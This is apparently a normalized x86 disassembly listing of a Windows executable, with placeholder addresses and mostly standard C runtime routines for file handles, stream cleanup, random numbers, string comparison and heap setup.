jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_40bc2a
push 0x10
push r--data
call sub_403d50
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_403d95
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_40a876
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x16
jmp r-xdata
call sub_405072
mov [ eax ] 0x9
call sub_405085
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_40b673
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_405020
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bd18
mov eax [ ebp - 0x1c ]
sub_40bd82
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_40aa47
push esi
mov edi eax
call sub_40c09c
push esi
call sub_408b66
push eax
call sub_40bfd8
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_405311
and [ esi + 0x1c ] 0x0
pop ecx
sub_40bdef
push 0xc
push r--data
call sub_403d50
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
or eax 0xffffffff
jmp r-xdata
push esi
call sub_408a88
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40bd82
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40be5b
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_403d95
retn
mov eax [ ebp - 0x1c ]
sub_40be63
push 0x10
push r--data
call sub_403d50
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405072
mov [ eax ] 0x9
call sub_405072
mov [ eax ] 0x9
call sub_405020
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_403d95
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40a876
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_405072
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40a80d
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bf34
mov eax [ ebp - 0x1c ]
call sub_405085
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_40bf3c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40a80d
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_405098
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_40a80d
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_40a80d
push 0x1
mov edi eax
call sub_40a80d
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_40a787
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_40bfd8
push 0x10
push r--data
call sub_403d50
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
call sub_405020
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_403d95
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40a876
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405072
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40bf3c
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c094
mov eax [ ebp - 0x1c ]
sub_40c09c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_405311
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40c0d0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_40c140
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
sub ecx 0x1
jne r-xdata
cmp ah bh
jb r-xdata
mov ah [ esi ]
add esi 0x1
mov al [ edi ]
add edi 0x1
cmp ah al
je r-xdata
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov ecx 0xffffffff
jb r-xdata
add al dh
neg ecx
sub_401940
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov esp ebp
pop ebp
retn
sub_4019b0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403230
add esp 0x8
pop ebp
retn
sub_4025c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call sub_402470
mov esp ebp
pop ebp
retn 0x4
sub_4025e0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call sub_401ae0
mov esp ebp
pop ebp
retn 0x4
sub_402940
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4028e0
add esp 0xc
pop ebp
retn
sub_4030ce
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_403772
sub_403205
call sub_403aa8
retn
sub_40320b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4031cf
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_40333a
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_4052e6
add esp 0xc
pop ebp
retn
sub_403350
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40333a
sub_403484
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_405311
sub_40348f
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_40534b
pop ecx
retn
sub_403550
mov edi edi
push ebp
mov ebp esp
call sub_406746
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_403562
call sub_406746
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_4036db
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_406c68
pop ecx
pop ecx
retn
sub_4036ef
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_403d1a
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_403d95
retn
push eax
call sub_403cf5
_start
call sub_407488
jmp sub_4035ac
sub_403723
mov [ ecx ] r--data
jmp sub_4075e0
sub_403755
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_407612
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_403a87
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_403a5c
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_403a9f
push 0x8
call sub_407a6d
pop ecx
retn
sub_403aa8
push 0x8
call sub_407994
pop ecx
retn
sub_403cca
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_407994
pop ecx
sub_403cdf
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_403b9f
add esp 0xc
pop ebp
retn
sub_403cf5
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_403b9f
add esp 0xc
pop ebp
retn
sub_403d0b
push 0x1
push 0x0
push 0x0
call sub_403b9f
add esp 0xc
retn
sub_403d1a
push 0x1
push 0x1
push 0x0
call sub_403b9f
add esp 0xc
retn
sub_403d29
mov edi edi
push ebp
mov ebp esp
call sub_406c2f
push [ ebp + 0x8 ]
call sub_406a80
pop ecx
push 0xff
call sub_403cf5
int3
sub_403d95
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_404e96
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4053b2
push 0xe
call sub_407994
pop ecx
retn
sub_406596
push 0x0
call [ EncodePointer@IAT ]
retn
sub_40659f
call [ TlsAlloc@IAT ]
retn 0x4
sub_4066bb
push 0xd
call sub_407994
pop ecx
retn
sub_4066c4
push 0xc
call sub_407994
pop ecx
retn
sub_40687a
push 0xd
call sub_407994
pop ecx
retn
sub_406886
push 0xc
call sub_407994
pop ecx
retn
sub_406a4c
push sub_406a0a
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40746a
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_407523
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_407540
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_40758d
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_405311
pop ecx
sub_4075e0
mov [ ecx ] r--data
jmp sub_40758d
sub_4076cb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40774e
and [ rw-data ] 0x0
retn
sub_407994
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_407a64
push 0xa
call sub_407994
pop ecx
retn
sub_407aa0
push 0x8
push r--data
call sub_403d50
call sub_406746
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40a5f0
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_407ac0
xor eax eax
inc eax
retn
sub_407ad9
push sub_407aa0
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_407aea
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_407b3f
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_407cb3
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_407994
pop ecx
sub_407cef
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_407cfe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_407e4b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_407f56
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_407e80
add esp 0xc
pop ebp
retn 0x4
sub_407f89
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_40a765
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_407fbb
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_407e80
add esp 0xc
pop ebp
retn 0x8
sub_408137
push [ ebp + 0x8 ]
call sub_40a915
pop ecx
retn
sub_40890a
push ebx
call sub_40a915
pop ecx
retn
sub_4089b1
mov eax rw-data
retn
sub_408a68
call sub_40abd1
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_405311
pop ecx
retn
call sub_40a9ab
sub_408e4a
push 0xd
call sub_407994
pop ecx
retn
sub_409219
push 0xd
call sub_407994
pop ecx
retn
sub_409252
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4090b8
pop ecx
mov [ rw-data ] 0x1
sub_40959d
push 0xc
call sub_407994
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_4095a9
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_409714
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4095bf
add esp 0x14
pop ebp
retn
sub_409769
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_409731
pop ecx
pop ecx
pop ebp
retn
sub_40a200
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a0ea
add esp 0x10
pop ebp
retn
sub_40a5d8
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_40a585
add esp 0x10
pop ebp
retn
sub_40a643
push 0x2
call sub_403d29
sub_40a739
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40a670
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40a784
call eax
retn
sub_40a90c
push 0xa
call sub_407994
pop ecx
retn
sub_40aa3e
push 0x1
call sub_407994
pop ecx
retn
sub_40ab99
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_408b37
pop ecx
pop ecx
retn
sub_40abc8
push 0x1
call sub_407994
pop ecx
retn
sub_40abd1
push 0x1
call sub_40aaf7
pop ecx
retn
sub_40b4c6
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_40bd18
push ebx
call sub_40a915
pop ecx
retn
sub_40bd20
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40a980
sub_40bd36
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40a980
sub_40bd4c
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_40bd6b
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_40be5b
push esi
call sub_408afb
pop ecx
retn
sub_40bf34
push ebx
call sub_40a915
pop ecx
retn
sub_40c094
push ebx
call sub_40a915
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40c1a0
push ebp
mov ebp esp
mov ecx rw-data
call sub_401940
pop ebp
retn
sub_40c1b0
push ebp
mov ebp esp
mov ecx rw-data
call sub_401940
pop ebp
retn
sub_40c1bf
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_4075e0
